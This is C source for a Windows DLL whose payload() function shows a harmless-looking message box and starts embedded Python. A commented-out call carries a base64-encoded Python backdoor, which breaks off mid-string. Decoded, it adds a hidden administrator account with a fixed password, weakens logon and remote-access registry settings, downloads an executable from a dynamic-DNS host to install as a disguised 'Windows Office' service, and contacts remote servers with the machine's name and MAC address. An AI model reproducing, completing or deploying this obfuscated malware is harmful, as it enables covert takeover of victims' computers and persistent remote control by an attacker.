/* Replace "dll.h" with the name of your header */
#include "dll.h"
#include<stdio.h>
#include<Windows.h>
#include<Python.h>

DLLIMPORT void payload()
{
	MessageBox(0,"Hello World from DLL!\n","Hi",MB_ICONINFORMATION);

	Py_Initialize();
    //PyRun_SimpleString("import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHdpbjMyc2VydmljZXV0aWwKaW1wb3J0IHdpbjMyc2VydmljZQppbXBvcnQgd2luMzJldmVudAppbXBvcnQgc29ja2V0CmltcG9ydCBzZXJ2aWNlbWFuYWdlcgppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBhc3luY29yZQppbXBvcnQgc2NoZWQsdGltZQppbXBvcnQgc3lzLGN0eXBlcwppbXBvcnQgb3MKCiNpbXBvcnQgQ3J5cHRvCiNpbXBvcnQgZWNkc2EKI2ltcG9ydCBwYXJhbWlrbwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5jbGllbnQKaW1wb3J0IHJlcXVlc3RzCiNpbXBvcnQgdXJsbGliMwppbXBvcnQgdXJsbGliLnJlcXVlc3QKI2ltcG9ydCBweWN1cmwKZnJvbSBvcyBpbXBvcnQgcGF0aCwgYWNjZXNzLCBSX09LCmZyb20gdXVpZCBpbXBvcnQgZ2V0bm9kZSBhcyBnZXRfbWFjCmZyb20gc3VicHJvY2VzcyBpbXBvcnQgUG9wZW4KI2Zyb20gZmFrZV91c2VyYWdlbnQgaW1wb3J0IFVzZXJBZ2VudAoKI2ltcG9ydCBsb2dnaW5nCiNmcm9tIGxvZ2dpbmcuaGFuZGxlcnMgaW1wb3J0IFJvdGF0aW5nRmlsZUhhbmRsZXIKCiNpbXBvcnQgd2luMzJ1aSwgd2luMzJndWksIHdpbjMyY29tLCBweXRob25jb20sIHdpbjMyY29uCiNmcm9tIHdpbjMyY29tLmNsaWVudCBpbXBvcnQgRGlzcGF0Y2gKI2Zyb20gdGltZSBpbXBvcnQgc2xlZXAKI2ltcG9ydCBfd2lucmVnCmRlZiBpc19hZG1pbigpOgogICAgdHJ5OgogICAgICAgIHJldHVybiBjdHlwZXMud2luZGxsLnNoZWxsMzIuSXNVc2VyQW5BZG1pbigpCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuIEZhbHNlCgoKCgoKCiNXaW4tUHl0aG9uLUJhY2tkb29yCgojcGlwIGluc3RhbGwgcmVxdWVzdHMKI3BpcCBpbnN0YWxsIGZha2VfdXNlcmFnZW50CiNzY3JpcHRzXHBpcDMgaW5zdGFsbCBweWluc3RhbGxlcgojY2QgJVVTRVJQUk9GSUxFJVxBcHBEYXRhXExvY2FsXFByb2dyYW1zXFB5dGhvblxQeXRob24zNwoKI2NvcHkgL3kgIiVVU0VSUFJPRklMRSVcRG9jdW1lbnRzXEdpdEh1YlxXaW4tUHl0aG9uLUJhY2tkb29yXHdvZmZpY2VpZTEzLnB5IiAlVVNFUlBST0ZJTEUlXEFwcERhdGFcTG9jYWxcUHJvZ3JhbXNcUHl0aG9uXFB5dGhvbjM3Cgojc2NyaXB0c1xweWluc3RhbGxlciAgLUYgLS1oaWRkZW4taW1wb3J0PXdpbjMydGltZXpvbmUgIHdvZmZpY2VpZTEzLnB5CiNzY3JpcHRzXHB5aW5zdGFsbGVyIC0tbWFuaWZlc3QgYnVpbGRcd29mZmljZWllMTNcd29mZmljZWllMTMuZXhlLm1hbmlmZXN0IC0tdWFjLWFkbWluIC1GIC0taGlkZGVuLWltcG9ydD13aW4zMnRpbWV6b25lICB3b2ZmaWNlaWUxMy5weQojY29weSAveSAlVVNFUlBST0ZJTEUlXEFwcERhdGFcTG9jYWxcUHJvZ3JhbXNcUHl0aG9uXFB5dGhvbjM3XGRpc3Rcd29mZmljZWllMTMuZXhlICVVU0VSUFJPRklMRSVcRG9jdW1lbnRzXEdpdEh1YlxXaW4tUHl0aG9uLUJhY2tkb29yXHd1cC5leGUKZGVmIEluaXQoKToKICAgICNvcy5lbnZpcm9uWyJSRVFVRVNUU19DQV9CVU5ETEUiXSA9IHN3aW4rIi9jYWNlcnQucGVtIgogICAgI29zLmVudmlyb25bIlJFUVVFU1RTX0NBX0JVTkRMRSJdID0gb3MucGF0aC5qb2luKG9zLmdldGN3ZCgpLCAiY2VydGlmaSIsICJjYWNlcnQucGVtIikKICAgICNjZXJ0aWZpLmNvcmUud2hlcmU9c3dpbisiL2NlcnRpZmkvY2FjZXJ0LnBlbSIKICAgICNyZXF1ZXN0cy51dGlscy5ERUZBVUxUX0NBX0JVTkRMRV9QQVRIPXN3aW4rIi9jZXJ0aWZpL2NhY2VydC5wZW0iCiAgICAjcmVxdWVzdHMuYWRhcHRlcnMuREVGQVVMVF9DQV9CVU5ETEVfUEFUSCA9IHN3aW4rIi9jZXJ0aWZpL2NhY2VydC5wZW0iCiNvcy5zeXN0ZW0oIm5ldC5leGUgdXNlciBBZG1pbmlzdHJhdG9yIC9hY3RpdmU6eWVzIikKICAgIG9zLnN5c3RlbSgibmV0LmV4ZSB1c2VyIGFzcCBRd2VydHkxMiEgL2FkZCIpCiAgICBvcy5zeXN0ZW0oIm5ldC5leGUgbG9jYWxncm91cCBhZG1pbmlzdHJhdG9ycyBhc3AgL2FkZCIpCiAgICBvcy5zeXN0ZW0oInJlZyBhZGQgSEtMTVxcU3lzdGVtXFxDdXJyZW50Q29udHJvbFNldFxcQ29udHJvbFxcTHNhIC92IGZvcmNlZ3Vlc3QgL3QgUkVHX0RXT1JEIC9kIDAgL2YiKQogICAgb3Muc3lzdGVtKCJyZWcgYWRkIEhLTE1cXFNPRlRXQVJFXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxQb2xpY2llc1xcc3lzdGVtIC92IExvY2FsQWNjb3VudFRva2VuRmlsdGVyUG9saWN5IC90IFJFR19EV09SRCAvZCAxIC9mIikKICAgIG9zLnN5c3RlbSgid21pYyBwYXRoIFdpbjMyX1VzZXJBY2NvdW50IHdoZXJlIE5hbWU9XCdhc3BcJyBzZXQgUGFzc3dvcmRFeHBpcmVzPWZhbHNlIikKICAgIG9zLnN5c3RlbSgicmVnIGFkZCBoa2xtXFxzeXN0ZW1cXGN1cnJlbnRjb250cm9sc2V0XFxjb250cm9sXFxsc2EgL3YgTGltaXRCbGFua1Bhc3N3b3JkVXNlIC90IFJFR19EV09SRCAvZCAwIC9mIikKICAgICNvcy5zeXN0ZW0oIm5ldHNoIGFkdmZpcmV3YWxsIHNldCBhbGxwcm9maWxlcyBzdGF0ZSBvZmYiKQojIyAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoJ2M6XFx3aW5kb3dzXFx3dXAuZXhlJyk6CiMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdwb3dlcnNoZWxsIC1Db21tYW5kIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHA6Ly9jZXJ0aWZpY2F0ZXMuZGRucy5uZXQvd29mZmljZWllLmV4ZSIgLU91dEZpbGUgImM6XFx3aW5kb3dzXFx3dXAuZXhlIicpCiMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5jYWxsKCJzYyBjcmVhdGUgd3VwIGJpblBhdGg9IFwiIitvcy5nZXRlbnYoJ3dpbmRpcicpKyJcXHd1cC5leGVcIiBEaXNwbGF5TmFtZT0gXCJXaW5kb3dzIE9mZmljZVwiIHN0YXJ0PSBhdXRvIiwgY3JlYXRpb25mbGFncz1DUkVBVEVfTk9fV0lORE9XKQojIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MuY2FsbCgibmV0IHN0YXJ0IHd1cCIsIGNyZWF0aW9uZmxhZ3M9Q1JFQVRFX05PX1dJTkRPVykKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cygnYzpcXHdpbmRvd3NcXHN5c3dvdzY0Jyk6CiAgICAgICAgb3Muc3lzdGVtKCdyZWcgYWRkICJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIE5UXFxDdXJyZW50VmVyc2lvblxcV2lubG9nb25cXFNwZWNpYWxBY2NvdW50cyIgL2YnKQogICAgICAgIG9zLnN5c3RlbSgncmVnIGFkZCAiSEtMTVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb25cXFdpbmxvZ29uXFxTcGVjaWFsQWNjb3VudHNcXFVzZXJMaXN0IiAvZicpCiAgICAgICAgb3Muc3lzdGVtKCdyZWcgYWRkICJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIE5UXFxDdXJyZW50VmVyc2lvblxcV2lubG9nb25cXFNwZWNpYWxBY2NvdW50c1xcVXNlckxpc3QiIC92IGFzcCAvdCBSRUdfRFdPUkQgL2QgMCAvZicpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgncmVnIGFkZCAiSEtMTVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb25cXFdpbmxvZ29uXFxTcGVjaWFsQWNjb3VudHMiIC9mIC9yZWc6NjQnKQogICAgICAgIG9zLnN5c3RlbSgncmVnIGFkZCAiSEtMTVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb25cXFdpbmxvZ29uXFxTcGVjaWFsQWNjb3VudHNcXFVzZXJMaXN0IiAvZiAvcmVnOjY0JykKICAgICAgICAjb3Muc3lzdGVtKCdyZWcgYWRkICJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIE5UXFxDdXJyZW50VmVyc2lvblxcV2lubG9nb25cXFNwZWNpYWxBY2NvdW50c1xcVXNlckxpc3QiIC92IEFkbWluaXN0cmF0b3IgL3QgUkVHX0RXT1JEIC9kIDAgL2YgL3JlZzo2NCcpCiAgICAgICAgb3Muc3lzdGVtKCdyZWcgYWRkICJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIE5UXFxDdXJyZW50VmVyc2lvblxcV2lubG9nb25cXFNwZWNpYWxBY2NvdW50c1xcVXNlckxpc3QiIC92IGFzcCAvdCBSRUdfRFdPUkQgL2QgMCAvZiAvcmVnOjY0JykKICAgIAogICAgCiAgICAjb3Muc3lzdGVtKCJuZXQuZXhlIHVzZXIgQWRtaW5pc3RyYXRvciBRd2VydHkxMiIpCiAgICBvcy5zeXN0ZW0oIm5ldC5leGUgdXNlciBhc3AgUXdlcnR5MTIhIikKICAgIG9zLnN5c3RlbSgibmV0LmV4ZSB1c2VyIGFzcCAvYWN0aXZlOnllcyIpCiAgICBzaW5pdD0nMScKCgpkZWYgZ2V0X21hY2FkZHJlc3MoaG9zdD0nbG9jYWxob3N0Jyk6CiAgICAiIiIgUmV0dXJucyB0aGUgTUFDIGFkZHJlc3Mgb2YgYSBuZXR3b3JrIGhvc3QsIHJlcXVpcmVzID49IFdJTjJLLiAiIiIKICAgICMgaHR0cDovL2FzcG4uYWN0aXZlc3RhdGUuY29tL0FTUE4vQ29va2Jvb2svUHl0aG9uL1JlY2lwZS8zNDc4MTIKICAgIAogICAgaW1wb3J0IHNvY2tldAogICAgaW1wb3J0IHN0cnVjdAogCiAgICAjIENoZWNrIGZvciBhcGkgYXZhaWxhYmlsaXR5CiAgICB0cnk6CiAgICAgICAgU2VuZEFSUCA9IGN0eXBlcy53aW5kbGwuSXBobHBhcGkuU2VuZEFSUAogICAgZXhjZXB0OgogICAgICAgIHJhaXNlIE5vdEltcGxlbWVudGVkRXJyb3IoJ1VzYWdlIG9ubHkgb24gV2luZG93cyAyMDAwIGFuZCBhYm92ZScpCiAKICAgICMgRG9lc24ndCB3b3JrIHdpdGggbG9vcGJhY2tzLCBidXQgbGV0J3MgdHJ5IGFuZCBoZWxwLgogICAgaWYgaG9zdCA9PSAnMTI3LjAuMC4xJyBvciBob3N0Lmxvd2VyKCkgPT0gJ2xvY2FsaG9zdCc6CiAgICAgICAgaG9zdCA9IHNvY2tldC5nZXRob3N0bmFtZSgpCiAKICAgICMgZ2V0aG9zdGJ5bmFtZSBibG9ja3MsIHNvIHVzZSBpdCB3aXNlbHkuCiAgICB0cnk6CiAgICAgICAgaW5ldGFkZHIgPSBjdHlwZXMud2luZGxsLndzb2NrMzIuaW5ldF9hZGRyKGhvc3QpCiAgICAgICAgaWYgaW5ldGFkZHIgaW4gKDAsIC0xKToKICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uCiAgICBleGNlcHQ6CiAgICAgICAgaG9zdGlwID0gc29ja2V0LmdldGhvc3RieW5hbWUoaG9zdCkKICAgICAgICBpbmV0YWRkciA9IGN0eXBlcy53aW5kbGwud3NvY2szMi5pbmV0X2FkZHIoaG9zdGlwKQogCiAgICBidWZmZXIgPSBjdHlwZXMuY19idWZmZXIoNikKICAgIGFkZGxlbiA9IGN0eXBlcy5jX3Vsb25nKGN0eXBlcy5zaXplb2YoYnVmZmVyKSkKICAgIGlmIFNlbmRBUlAoaW5ldGFkZHIsIDAsIGN0eXBlcy5ieXJlZihidWZmZXIpLCBjdHlwZXMuYnlyZWYoYWRkbGVuKSkgIT0gMDoKICAgICAgICByYWlzZSBXaW5kb3dzRXJyb3IoJ1JldHJlaXZhbCBvZiBtYWMgYWRkcmVzcyglcykgLSBmYWlsZWQnICUgaG9zdCkKIAogICAgIyBDb252ZXJ0IGJpbmFyeSBkYXRhIGludG8gYSBzdHJpbmcuCiAgICBtYWNhZGRyID0gJycKICAgIGZvciBpbnR2YWwgaW4gc3RydWN0LnVucGFjaygnQkJCQkJCJywgYnVmZmVyKToKICAgICAgICBpZiBpbnR2YWwgPiAxNToKICAgICAgICAgICAgcmVwbGFjZXN0ciA9ICcweCcKICAgICAgICBlbHNlOgogICAgICAgICAgICByZXBsYWNlc3RyID0gJ3gnCiAgICAgICAgaWYgbWFjYWRkciAhPSAnJzoKICAgICAgICAgICAgI21hY2FkZHIgPSAnOicuam9pbihbbWFjYWRkciwgaGV4KGludHZhbCkucmVwbGFjZShyZXBsYWNlc3RyLCAnJyldKQogICAgICAgICAgICBtYWNhZGRyID0gJycuam9pbihbbWFjYWRkciwgaGV4KGludHZhbCkucmVwbGFjZShyZXBsYWNlc3RyLCAnJyldKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIG1hY2FkZHIgPSAnJy5qb2luKFttYWNhZGRyLCBoZXgoaW50dmFsKS5yZXBsYWNlKHJlcGxhY2VzdHIsICcnKV0pCiAKICAgIHJldHVybiBtYWNhZGRyLnVwcGVyKCkKCiN0cnk6CiMgICAgQ1JFQVRFX05PX1dJTkRPVyA9IDB4MDgwMDAwMDAKIyAgICBzd2luPW9zLmdldGVudignd2luZGlyJykKIyAgICBzdXNlcj1vcy5nZXRlbnYoJ1VTRVJQUk9GSUxFJykKIyAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoJ2M6XFx3aW5kb3dzXFx3dXAuZXhlJyk6CiAgICAgICAgCiMjICAgIGYgPSB1cmxsaWIyLnVybG9wZW4oImh0dHA6Ly9jZXJ0aWZpY2F0ZXMuZGRucy5uZXQvd29mZmljZWllLmV4ZSIpCiMjICAgIHdpdGggb3Blbihzd2luKydcXHd1cC5leGUnLCJ3YiIpIGFzIGNvZGU6CiMjICAgICAgICBjb2RlLndyaXRlKGYucmVhZCgpKQogICAgI29zLnN5c3RlbSgncG93ZXJzaGVsbCAtQ29tbWFuZCBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICJodHRwOi8vNTQuMjE4LjgwLjE4OC93b2ZmaWNlaWUuZXhlIiAtT3V0RmlsZSAiYzpcXHdpbmRvd3NcXHd1cC5leGUiJykKICAgICN3aGlsZSBub3Qgb3MucGF0aC5leGlzdHMoJ2M6XFx3aW5kb3dzXFx3dXAuZXhlJyk6CiAgICAjICAgIHRpbWUuc2xlZXAoNSkKICAgICNzdWJwcm9jZXNzLmNhbGwoIm1vdmUgIitzd2luKydcXHdvZmZpY2VpZS5leGUgJytzd2luKydcXHd1cC5leGUnLCBjcmVhdGlvbmZsYWdzPTB4MDgwMDAwMDApCiAgICAjc3VicHJvY2Vzcy5jYWxsKCJjbWQgL2MgY29weSAveSAiK29zLmdldGN3ZCgpKyJcXHdvZmZpY2VpZS5leGUgIiArc3dpbisiXFx3dXAuZXhlIiwgY3JlYXRpb25mbGFncz1DUkVBVEVfTk9fV0lORE9XKQogICAgCiAgICAjc3VicHJvY2Vzcy5jYWxsKCJUQVNLS0lMTCAvRiAvSU0gd3VwLmV4ZSIsIGNyZWF0aW9uZmxhZ3M9Q1JFQVRFX05PX1dJTkRPVykKICAgICN0aW1lLnNsZWVwKDEpCiAgICAjc3VicHJvY2Vzcy5jYWxsKCJjbWQgL2MgZGVsICIrc3dpbisiXFx3dXAuZXhlIiwgY3JlYXRpb25mbGFncz1DUkVBVEVfTk9fV0lORE9XKQogICAgI3RpbWUuc2xlZXAoMSkKIyAgICAgICAgc3VicHJvY2Vzcy5jYWxsKCJjbWQgL2MgY29weSAveSAiK3N5cy5hcmd2WzBdKyIgIiArc3dpbisiXFx3dXAuZXhlIiwgY3JlYXRpb25mbGFncz1DUkVBVEVfTk9fV0lORE9XKQojICAgICAgICBzdWJwcm9jZXNzLmNhbGwoInNjIGNyZWF0ZSB3dXAgYmluUGF0aD0gXCIiK29zLmdldGVudignd2luZGlyJykrIlxcd3VwLmV4ZVwiIERpc3BsYXlOYW1lPSBcIldpbmRvd3MgT2ZmaWNlXCIgc3RhcnQ9IGF1dG8iLCBjcmVhdGlvbmZsYWdzPTB4MDgwMDAwMDApCiAgICAgICAgI3ByaW50KCJzY2h0YXNrcyAvY3JlYXRlIC9ydSBcIlNZU1RFTVwiIC9zYyBtaW51dGUgL21vIDIgL3RyIFwibmV0IHN0YXJ0IHd1cFwiIC90biBteWFkb2JlIC9ybCBoaWdoZXN0IikKIyAgICAgICAgc3VicHJvY2Vzcy5jYWxsKCJzY2h0YXNrcyAvY3JlYXRlIC9ydSBcIlNZU1RFTVwiIC9zYyBtaW51dGUgL21vIDIgL3RyIFwibmV0IHN0YXJ0IHd1cFwiIC90biBteWFkb2JlIC9ybCBoaWdoZXN0IC9GIiwgY3JlYXRpb25mbGFncz1DUkVBVEVfTk9fV0lORE9XKQogICAgICAgICNzdWJwcm9jZXNzLmNhbGwoIm5ldHNoIGFkdmZpcmV3YWxsIHNldCBhbGxwcm9maWxlcyBzdGF0ZSBvZmYiLCBjcmVhdGlvbmZsYWdzPUNSRUFURV9OT19XSU5ET1cpCiMgICAgICAgIHN1YnByb2Nlc3MuY2FsbCgibmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgYWRkIHJ1bGUgbmFtZT1cIk9wZW4gUG9ydCA0NDVcIiBkaXI9aW4gYWN0aW9uPWFsbG93IHByb3RvY29sPVRDUCBsb2NhbHBvcnQ9NDQ1IiwgY3JlYXRpb25mbGFncz1DUkVBVEVfTk9fV0lORE9XKQojICAgICAgICBJbml0KCkKIyAgICAgICAgc3VicHJvY2Vzcy5jYWxsKCJuZXQgc3RhcnQgd3VwIiwgY3JlYXRpb25mbGFncz0weDA4MDAwMDAwKQogICAgICAgICNvcy5zeXN0ZW0oIm5ldHNoIGFkdmZpcmV3YWxsIHNldCBhbGxwcm9maWxlcyBzdGF0ZSBvZmYiKQogICAgI29zLnN5c3RlbSgibmV0LmV4ZSB1c2VyIEFkbWluaXN0cmF0b3IgL2FjdGl2ZTp5ZXMiKQogICAgI29zLnN5c3RlbSgibmV0LmV4ZSB1c2VyIEFkbWluaXN0cmF0b3IgUXdlcnR5MTIiKQogICAgI215bG9vcCgpCiNleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiMgICAgcHJpbnQgKHN0cihlKSkKI2NsYXNzIEFwcFNlcnZlclN2YyAod2luMzJzZXJ2aWNldXRpbC5TZXJ2aWNlRnJhbWV3b3JrKToKIyAgICBfc3ZjX25hbWVfID0gIndvZmZpY2VpZSIKIyAgICBfc3ZjX2Rpc3BsYXlfbmFtZV8gPSAiV2luZG93cyBPZmZpY2UiCgojICAgIGRlZiBfX2luaXRfXyhzZWxmLGFyZ3MpOgojICAgICAgICB3aW4zMnNlcnZpY2V1dGlsLlNlcnZpY2VGcmFtZXdvcmsuX19pbml0X18oc2VsZixhcmdzKQojICAgICAgICBzZWxmLmhXYWl0U3RvcCA9IHdpbjMyZXZlbnQuQ3JlYXRlRXZlbnQoTm9uZSwwLDAsTm9uZSkKCiMgICAgZGVmIFN2Y1N0b3Aoc2VsZik6CiMgICAgICAgIHNlbGYuUmVwb3J0U2VydmljZVN0YXR1cyh3aW4zMnNlcnZpY2UuU0VSVklDRV9TVE9QX1BFTkRJTkcpCiMgICAgICAgIHdpbjMyZXZlbnQuU2V0RXZlbnQoc2VsZi5oV2FpdFN0b3ApCiMgICAgZGVmIFN2Y0RvUnVuKHNlbGYpOgojICAgICAgICAjcHJpbnQgZ2V0UHJveHkoKSAgICAgICAgCiMgICAgICAgIHNlbGYuUmVwb3J0U2VydmljZVN0YXR1cyh3aW4zMnNlcnZpY2UuU0VSVklDRV9SVU5OSU5HKQogICAgICAgIAojICAgICAgICBJbml0KCkKICAgICAgICAKICAgICAgICAjc2VsZi5zdG9wcGluZyA9IEZhbHNlCgogICAgICAgICN3aGlsZSBub3Qgc2VsZi5zdG9wcGluZzoKICAgICAgICAKIyAgICAgICAgd2hpbGUgVHJ1ZToKIyAgICAgICAgICAgIHRyeToKIyAgICAgICAgICAgICAgIG15bG9vcCgpIAojICAgICAgICAgICAgICAgdGltZS5zbGVlcCg2MCkKIyAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKIyAgICAgICAgICAgICAgIHByaW50IChzdHIoZSkpIAojICAgICAgICAgICAgICAgdGltZS5zbGVlcCg2MCkKIyAgICAgICAgICAgICAgIG15bG9vcCgpICAgICAgCgoKICAgICAgIAoKZGVmIG15bG9vcCgpOgogICAgI3RocmVhZGluZy5UaW1lcigxMC4wLCBteWxvb3ApLnN0YXJ0KCkgIyBjYWxsZWQgZXZlcnkgbWludXRlICAgCiAgICBzaW5pdD0nMCcKICAgICNzaXRlcyA9IFsicGFuZXIuYWx0ZXJ2aXN0YS5vcmciLCAidmVyaWZpY2hlLmRkbnMubmV0Il0KICAgICN1YSA9IFVzZXJBZ2VudCgpCiAgICAjaGVhZGVyID0geydVc2VyLUFnZW50JzpzdHIodWEuY2hyb21lKX0KICAgIHNpdGVzID0gWyJwYW5lci5hbHRlcnZpc3RhLm9yZyJdIywgbWFpbnNpdGUudGV4dF0KICAgIGhlYWRlciA9IHsnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCd9CiAgICB0cnk6CiAgICAgIGlwPXNvY2tldC5nZXRob3N0YnluYW1lKCdjb25maWcwMS5ob21lcGMuaXQnKQogICAgICBtYWluc2l0ZSA9IHJlcXVlc3RzLmdldCgiaHR0cDovLyIraXArIi9zaXRlLnR4dCIsIGhlYWRlcnM9aGVhZGVyKQogICAgICBmb3IgbXlzaXRlIGluIG1haW5zaXRlLnRleHQuc3BsaXQoIiwiKToKICAgICAgICAgI3ByaW50IHNvY2tldC5nZXRob3N0YnluYW1lKG15c2l0ZSkKICAgICAgICAgc2l0ZXMuYXBwZW5kKHNvY2tldC5nZXRob3N0YnluYW1lKG15c2l0ZSkpCiAgICAgICNzaXRlcy5leHRlbmQobWFpbnNpdGUudGV4dC5zcGxpdCgiLCIpICkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgcHJpbnQgKHN0cihlKSkKICAgICNwID0gUG9wZW4oImN1cmwgLUwgLUEgJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDUuMSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzM0LjAuMTg2Ni4yMzcgU2FmYXJpLzUzNy4zNicgaHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL3VjP2V4cG9ydD1kb3dubG9hZCZpZD0xblQyaFFXVzF0T01feXhQSzVfbmhJbTh4QlZFVEdYZEYgLW8gIitvcy5nZXRlbnYoJ1RFTVAnKSsiXFxzaXRlcy50eHQiLHNoZWxsPVRydWUpCiAgICAjdGltZS5zbGVlcCg1KQogICAgI3RleHRfZmlsZSA9IG9wZW4ob3MuZ2V0ZW52KCdURU1QJykrIlxcc2l0ZXMudHh0IiwgInIiKSAgICAKICAgICN0ZXh0X2ZpbGVfY29udGVudD10ZXh0X2ZpbGUucmVhZCgpCiAgICAjc2l0ZXMuZXh0ZW5kKHRleHRfZmlsZV9jb250ZW50LnNwbGl0KCIsIikgKQogICAgI3RleHRfZmlsZS5jbG9zZSgpCiAgICAjcHJpbnQgbWFpbnNpdGUudGV4dAogICAgCiAgICAKICAgICNzaXRlPSJwYW5lci5hbHRlcnZpc3RhLm9yZyIKICAgIHNpdGUxPSJwYW5lci5hbHRlcnZpc3RhLm9yZyIKICAgIHNpdGUyPSI1Mi4yNi4xMjQuMTQ1IgogICAgc2l0ZTM9ImNlcnRpZmljYXRlcy5kZG5zLm5ldCIKICAgICNvcy5zeXN0ZW0oInJlZyBhZGQgSEtMTVxcU29mdHdhcmVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1biAvdiB1cmxzcGFjZSAvdCBSRUdfU1ogICAvZCAgIitvcy5nZXRlbnYoJ3dpbmRpcicpKyJcXHVwLmV4ZSAvZiIpCiAgICAjb3Muc3lzdGVtKCJjbWQgL2MgY29weSAveSAiK29zLmdldGVudignd2luZGlyJykrIlxcdXBpZS5leGUgIitvcy5nZXRlbnYoJ3dpbmRpcicpKyJcXHVwLmV4ZSIpCgoKICAgIAogICAgCiAgICAKICAgICNwcmludChoZWFkZXIpCiAgICAKICAgIAojICAgIGxvZ19mb3JtYXR0ZXIgPSBsb2dnaW5nLkZvcm1hdHRlcignJShhc2N0aW1lKXMgJShtZXNzYWdlKXMnLCBkYXRlZm10PSclbS8lZC8lWSAlSTolTTolUyAlcCcpCgojICAgIGxvZ0ZpbGUgPSBvcy5nZXRlbnYoJ3dpbmRpcicpKyJcXHd1cC5sb2ciCgojICAgIG15X2hhbmRsZXIgPSBSb3RhdGluZ0ZpbGVIYW5kbGVyKGxvZ0ZpbGUsIG1vZGU9J2EnLCBtYXhCeXRlcz0xKjEwMjQsIAojICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYmFja3VwQ291bnQ9MiwgZW5jb2Rpbmc9Tm9uZSwgZGVsYXk9MCkKIyAgICBteV9oYW5kbGVyLnNldEZvcm1hdHRlcihsb2dfZm9ybWF0dGVyKQojICAgIG15X2hhbmRsZXIuc2V0TGV2ZWwobG9nZ2luZy5JTkZPKQoKIyAgICBhcHBfbG9nID0gbG9nZ2luZy5nZXRMb2dnZXIoJ3Jvb3QnKQojICAgIGFwcF9sb2cuc2V0TGV2ZWwobG9nZ2luZy5JTkZPKQoKIyAgICBhcHBfbG9nLmFkZEhhbmRsZXIobXlfaGFuZGxlcikKCgogICAgI2FwcF9sb2cuaW5mbygiZGF0YSIpCiAgICAKICAgIAogICAgI2xvZ2dpbmcuYmFzaWNDb25maWcoZmlsZW5hbWU9b3MuZ2V0ZW52KCd3aW5kaXInKSsiXFx3dXAubG9nIixsZXZlbD1sb2dnaW5nLklORk8sIGZvcm1hdD0nJShhc2N0aW1lKXMgJShtZXNzYWdlKXMnLCBkYXRlZm10PSclbS8lZC8lWSAlSTolTTolUyAlcCcpCiMgICAgYXBwX2xvZy5pbmZvKCdTdGFydCcpCiAgICAKICAgIAoKICAgIAogICAgCiN3aGlsZSBUcnVlOgoKICAgIAogICAgZm9yIHNpdGUgaW4gc2l0ZXM6CiAgICAgIHRyeToKICAgICAgICAgICAgICAjYXBwX2xvZy5pbmZvKCdTdGVwJykKICAgICAgICAgICAgICAjaWYgc2luaXQgPT0gJzAnOgogICAgICAgICAgICAgICMgICAgICAgIEluaXQoKQogICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgI2h0dHBTZXJ2ID0gaHR0cGxpYi5IVFRQQ29ubmVjdGlvbihzaXRlLCA4MCkKICAgICAgICAgICAgICAjaHR0cFNlcnYuY29ubmVjdCgpCiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgbXltYWMgPSBnZXRfbWFjKCkKICAgICAgICAgICAgICAjc21hY2FkZHJlc3MgPSBnZXRfbWFjYWRkcmVzcygnbG9jYWxob3N0JykKICAgICAgICAgICAgICBzbWFjYWRkcmVzcz1zdHIoZ2V0X21hYygpKQogICAgICAgICAgICAgIHNDT01QVVRFUk5BTUU9b3MuZ2V0ZW52KCdDT01QVVRFUk5BTUUnKSsiXyIrc21hY2FkZHJlc3MKICAgICAgICAgICAgICBzVGltZT10aW1lLmN0aW1lKG9zLnBhdGguZ2V0bXRpbWUob3MuZ2V0ZW52KCd3aW5kaXInKSsiXFx3dXAuZXhlIikpCiAgICAgICAgICAgICAgc1RpbWU9c1RpbWUucmVwbGFjZSgiICIsIl8iKQogICAgICAgICAgICAgICNvcGVuZXIgPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihTb2Nrc2lQeUhhbmRsZXIoc29ja3MuUFJPWFlfVFlQRV9TT0NLUzQsICc1Mi4yNi4xMjQuMTQ1JywgODA4MCkpCiAgICAgICAgICAgICAgI3Jlc3BvbnNlID0gb3BlbmVyLm9wZW4oImh0dHA